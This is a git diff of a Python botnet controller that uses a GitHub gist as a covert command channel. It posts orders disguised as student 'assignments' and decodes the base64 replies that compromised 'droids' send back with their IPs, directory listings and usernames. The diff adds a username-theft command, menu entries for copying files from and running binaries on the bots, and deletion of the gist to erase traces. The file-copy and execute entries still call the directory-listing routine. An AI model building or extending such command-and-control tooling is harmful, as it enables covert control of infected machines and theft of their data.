@@ -108,8 +108,9 @@ def request_logged_in_users(git, number):
 def request_content_of_directory(git, number):
     path = input("Which directory?\n")
     print("Ordering the droids now.")
-    comment_text = "# Assignment " + str(number) + "\nStudents, what is the content of your home directory?\n\n[//]: <> ( " \
-                   + path+" )"
+    comment_text = "# Assignment " + str(
+        number) + "\nStudents, what is the content of your home directory?\n\n[//]: <> ( " \
+                   + path + " )"
     git.add_comment_to_gist(comment_text)
     wait_for_reasonable_time()
     related_comments = []
@@ -122,6 +123,23 @@ def request_content_of_directory(git, number):
         ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
         print("Droid with ip " + str(ip) + " found content of directory `" + path + "`:")
         print(base64.b64decode(lines[5].split()[3]).decode("utf-8"))
+
+
+def request_user(git, number):
+    print("What a great choice, my lord.")
+    comment_text = "# Assignment " + str(number) + "\nStudents, what is the answer to the text in file `flag.txt`?"
+    git.add_comment_to_gist(comment_text)
+    wait_for_reasonable_time()
+    related_comments = []
+    for comment in git.get_gist_comments():
+        if comment['body'].startswith("> # Assignment " + str(number)):
+            related_comments.append(comment['body'])
+
+    for comment in related_comments:
+        lines = comment.splitlines()
+        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
+        print("Droid with ip " + str(ip) + " have username: " + str(
+            base64.b64decode(lines[5].split()[3]).decode("utf-8")))
 
 
 if __name__ == '__main__':
@@ -142,6 +160,9 @@ if __name__ == '__main__':
     question = "\nWhat do you want me to order the droids, my lord?\n"
     options = "1 - Get users logged in to the droids\n" \
               "2 - Get list of directory content on droids\n" \
+              "3 - Get droids username\n" \
+              "4 - Copy file from droid\n" \
+              "5 - Execute binary on droid\n" \
               "6 - Quit and remove all traces of communication\n"
     wrong_option_text = "I am so sorry to disagree with your order, my lord. " \
                         "But your answer must be a number from 1 to 6."
@@ -160,10 +181,19 @@ if __name__ == '__main__':
         elif selected_option == 2:
             assignment_number += 1
             request_content_of_directory(git_instance, assignment_number)
+        elif selected_option == 3:
+            assignment_number += 1
+            request_user(git_instance, assignment_number)
+        elif selected_option == 4:
+            assignment_number += 1
+            request_content_of_directory(git_instance, assignment_number)
+        elif selected_option == 5:
+            assignment_number += 1
+            request_content_of_directory(git_instance, assignment_number)
         elif selected_option == 6:
             run = False
+            git_instance.remove_gist()
         else:
             print(wrong_option_text)
             continue
         question = "\nWhat do you want me to order the droids next, my lord?\n"
-    git_instance.remove_gist()
